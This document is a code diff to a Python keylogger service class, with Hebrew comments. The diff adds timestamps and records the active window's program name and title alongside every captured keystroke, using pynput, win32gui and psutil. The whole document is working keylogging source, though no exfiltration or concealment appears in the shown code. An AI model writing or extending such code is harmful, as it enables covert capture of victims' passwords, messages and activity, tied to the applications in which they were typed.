@@ -1,28 +1,36 @@
 import threading
+import time
 from pynput import keyboard
+import win32gui
+import win32process
+import psutil
 from interfaces.ikeyLogger import Ikeylogger
 
 class Keyloggerservice(Ikeylogger):
+    NUMPAD_VK_MAP = {
+        96: '0', 97: '1', 98: '2', 99: '3',
+        100: '4', 101: '5', 102: '6', 103: '7',
+        104: '8', 105: '9', 110: '.'
+    }
+
     def __init__(self):
         self.logged_keys = []
         self.listener = None
         self.lock = threading.Lock()
-    
-    NUMPAD_VK_MAP = {
-    96: '0',  # NumPad 0
-    97: '1',  # NumPad 1
-    98: '2',  # NumPad 2
-    99: '3',  # NumPad 3
-    100: '4', # NumPad 4
-    101: '5', # NumPad 5
-    102: '6', # NumPad 6
-    103: '7', # NumPad 7
-    104: '8', # NumPad 8
-    105: '9', # NumPad 9
-    110: '.'  # NumPad .
-}
 
-# במקרה של מקש מיוחד כגון המקשים בצד ימין של המקלדת שמוצגים אחרת אז צריך לקחת מהמילון
+    # פונקציה לזיהוי החלון הפעיל
+    def get_active_window(self):
+        try:
+            hwnd = win32gui.GetForegroundWindow()
+            _, pid = win32process.GetWindowThreadProcessId(hwnd)
+            process = psutil.Process(pid)
+            exe_name = process.name()
+            window_title = win32gui.GetWindowText(hwnd)
+            return exe_name, window_title
+        except Exception:
+            return "Unknown", "Unknown"
+
+    # טיפול במקשים מיוחדים
     def special_tag(self, key):
         if hasattr(key, 'char') and key.char is not None:
             return key.char
@@ -41,12 +49,15 @@ class Keyloggerservice(Ikeylogger):
         elif key == keyboard.Key.ctrl_r or key == keyboard.Key.ctrl_l:
             return '<ctl>'
         else:
-            return f'[{key}]'  # תציג את שם המקש למעקב
+            return f'[{key}]'
 
+    # קריאה בכל הקשה
     def _on_press(self, key):
         try:
             with self.lock:
-                self.logged_keys.append(self.special_tag(key))
+                exe, window = self.get_active_window()
+                entry = f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {exe} - {window} : {self.special_tag(key)}"
+                self.logged_keys.append(entry)
         except Exception:
             pass
 
@@ -61,9 +72,9 @@ class Keyloggerservice(Ikeylogger):
             self.listener.stop()
             self.listener = None
 
-
     def get_logged_keys(self):
         with self.lock:
             keys_copy = self.logged_keys.copy()
             self.logged_keys.clear()
         return keys_copy
+
